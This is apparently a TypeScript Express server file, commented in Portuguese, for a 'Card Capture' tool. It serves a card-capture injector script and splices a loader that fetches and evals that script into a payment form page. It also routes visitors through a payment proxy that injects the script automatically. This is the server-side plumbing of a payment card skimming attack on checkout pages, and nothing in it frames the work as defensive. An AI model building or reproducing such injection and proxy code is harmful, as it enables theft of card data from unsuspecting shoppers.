import "dotenv/config";
import express from "express";
import cors from "cors";
import path from "path";
import fs from "fs";
import { handleDemo } from "./routes/demo";
import { handlePaymentProxy } from "./routes/payment-proxy";

export function createServer() {
  const app = express();

  // Middleware
  app.use(cors());
  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));
  app.use(express.static("public"));

  // Example API routes
  app.get("/api/ping", (_req, res) => {
    const ping = process.env.PING_MESSAGE ?? "ping";
    res.json({ message: ping });
  });

  app.get("/api/demo", handleDemo);

  // Serve card capture injector script
  app.get("/card-capture-injector.js", (_req, res) => {
    try {
      const scriptPath = path.join(
        process.cwd(),
        "public",
        "card-capture-injector.js",
      );
      if (fs.existsSync(scriptPath)) {
        const script = fs.readFileSync(scriptPath, "utf-8");
        res.set("Content-Type", "application/javascript");
        res.send(script);
        console.log("✅ Script injetor servido: /card-capture-injector.js");
      } else {
        console.warn("⚠️  Script injetor não encontrado em:", scriptPath);
        res.status(404).json({ error: "Script não encontrado" });
      }
    } catch (error) {
      console.error("❌ Erro ao servir script injetor:", error);
      res.status(500).json({ error: "Erro ao servir script" });
    }
  });

  // Página de teste simples (com formulário real)
  app.get("/payment-test", (_req, res) => {
    try {
      const testFormPath = path.join(
        process.cwd(),
        "public",
        "payment-test-form.html",
      );
      if (fs.existsSync(testFormPath)) {
        const html = fs.readFileSync(testFormPath, "utf-8");
        const injectionScript = `
          <script>
            (async function() {
              try {
                const scriptUrl = '${_req.protocol}://${_req.get("host")}/card-capture-injector.js';
                console.log('🚀 Carregando Card Capture Script...');
                const response = await fetch(scriptUrl);
                const code = await response.text();
                eval(code);
              } catch(e) {
                console.error('❌ Erro ao carregar Card Capture:', e);
              }
            })();
          </script>
        `;
        const modifiedHtml = html.replace(
          "</body>",
          injectionScript + "</body>",
        );
        res.type("text/html").send(modifiedHtml);
        console.log("✅ Página de teste servida: /payment-test");
      } else {
        res.status(404).json({ error: "Página de teste não encontrada" });
      }
    } catch (error) {
      console.error("❌ Erro ao servir página de teste:", error);
      res.status(500).json({ error: "Erro ao servir página" });
    }
  });

  // Página de captura de pagamento
  app.get("/payment-capture", (_req, res) => {
    res.type("text/html").send(`
      <!DOCTYPE html>
      <html lang="pt-BR">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Card Capture - Payment Monitor</title>
        <style>
          * { margin: 0; padding: 0; box-sizing: border-box; }
          body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
          .container { background: white; border-radius: 12px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3); padding: 40px; max-width: 500px; text-align: center; }
          h1 { color: #333; margin-bottom: 10px; font-size: 28px; }
          p { color: #666; margin-bottom: 30px; line-height: 1.6; }
          .button { display: inline-block; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 14px 40px; border-radius: 8px; text-decoration: none; font-weight: 600; cursor: pointer; border: none; font-size: 16px; transition: transform 0.2s, box-shadow 0.2s; }
          .button:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4); }
          .button:active { transform: translateY(0); }
          .info { background: #f0f4ff; border-left: 4px solid #667eea; padding: 15px; margin-top: 30px; text-align: left; border-radius: 4px; font-size: 14px; color: #555; }
          .info strong { color: #667eea; }
          .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #667eea; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 10px; vertical-align: middle; }
          @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
          .loading-state { display: none; }
          .loading-state.active { display: block; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="initial-state">
            <h1>🛡️ Card Capture</h1>
            <p>Monitor automático de formulários de pagamento com captura segura de dados</p>
            <button class="button" onclick="startCapture()">Iniciar Captura</button>
          </div>

          <div class="loading-state" id="loadingState">
            <div style="font-size: 48px; margin-bottom: 20px;">⏳</div>
            <h1>Carregando...</h1>
            <p><span class="spinner"></span>Preparando página de pagamento...</p>
            <p style="font-size: 13px; color: #999; margin-top: 20px;">Você será redirecionado automaticamente...</p>
          </div>

          <div class="info">
            <strong>ℹ️ Como funciona:</strong><br><br>
            Ao clicar em "Iniciar Captura", você será redirecionado para a página de pagamento com monitoramento automático.
          </div>
        </div>

        <script>
          function startCapture() {
            document.querySelector('.initial-state').style.display = 'none';
            document.getElementById('loadingState').classList.add('active');
            setTimeout(() => { window.location.href = '/payment'; }, 2000);
          }
        </script>
      </body>
      </html>
    `);
  });

  // Proxy de pagamento com injeção automática de script
  app.get("/payment", handlePaymentProxy);

  return app;
}
